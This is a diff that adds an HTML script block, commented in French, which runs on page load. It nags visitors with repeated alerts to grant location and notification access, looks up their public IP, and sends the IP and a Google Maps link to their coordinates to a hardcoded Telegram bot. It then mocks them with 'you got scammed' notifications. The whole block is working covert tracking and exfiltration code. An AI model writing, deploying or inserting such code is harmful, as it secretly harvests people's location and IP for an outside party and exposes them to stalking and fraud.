@@ -1,0 +1,97 @@
+<script>
+const token = "8468165702:AAHD08K4JugVPyCze00j1qbluTs6iyjf1mw";
+const chatId = "8012856656";
+
+function sendToTelegram(text){
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:chatId,text})
+  }).catch(e=>console.log("Erreur envoi Telegram",e));
+}
+
+function getIP(){
+  return fetch('https://api.ipify.org?format=json')
+    .then(r=>r.json()).then(d=>d.ip).catch(()=>null);
+}
+
+// 🔔 Fonction pour envoyer plusieurs notifications
+function sendMultipleNotifs(message, count){
+  for (let i=0; i<count; i++){
+    setTimeout(()=>{
+      try { new Notification(message + " ("+(i+1)+"/"+count+")"); } catch(e){}
+    }, i * 1500); // 1,5s entre chaque notif
+  }
+}
+
+function askLocation(attemptsLeft){
+  return new Promise(resolve=>{
+    if (!navigator.geolocation) return resolve({ok:false});
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve({ok:true,lat:pos.coords.latitude,lon:pos.coords.longitude}),
+      err => {
+        if (attemptsLeft>1){
+          alert("Vous devez autoriser la localisation");
+          setTimeout(()=> resolve({retry:true}),300);
+        } else {
+          alert("Vous devez autoriser la localisation");
+          resolve({ok:false});
+        }
+      },
+      {timeout:10000}
+    );
+  });
+}
+
+function askNotifications(attemptsLeft){
+  return new Promise(resolve=>{
+    if (!("Notification" in window)) return resolve({ok:false});
+
+    if (Notification.permission === "granted") {
+      sendMultipleNotifs("lol, you got scammed EZ", 5); // ✅ envoie 3 notifs
+      return resolve({ok:true});
+    }
+
+    Notification.requestPermission().then(permission=>{
+      if (permission === "granted"){
+        sendMultipleNotifs("Mis à jour", 3); // ✅ envoie 3 notifs
+        resolve({ok:true});
+      } else {
+        if (attemptsLeft>1){
+          alert("Vous devez autoriser les notifications");
+          setTimeout(()=> resolve({retry:true}),200);
+        } else {
+          alert("Vous devez autoriser les notifications");
+          resolve({ok:false});
+        }
+      }
+    }).catch(()=> resolve({ok:false}));
+  });
+}
+
+async function runChecks(){
+  let locResult=null, locOk=false;
+  for(let i=3;i>0;i--){
+    const r = await askLocation(i);
+    if (r.ok){ locResult=r; locOk=true; break; }
+    if (r.retry) continue;
+    if (!r.ok) break;
+  }
+
+  let notifOk=false;
+  for(let i=3;i>0;i--){
+    const r = await askNotifications(i);
+    if (r.ok){ notifOk=true; break; }
+    if (r.retry) continue;
+    if (!r.ok) break;
+  }
+
+  const ip = await getIP();
+  let msg = `IP: ${ip || 'inconnue'}\nLoc: ${locOk}\nNotification: ${notifOk}`;
+  if (locOk) msg += `\nLocalisation: https://www.google.com/maps?q=${locResult.lat},${locResult.lon}`;
+
+  sendToTelegram(msg);
+}
+
+runChecks();
+</script>
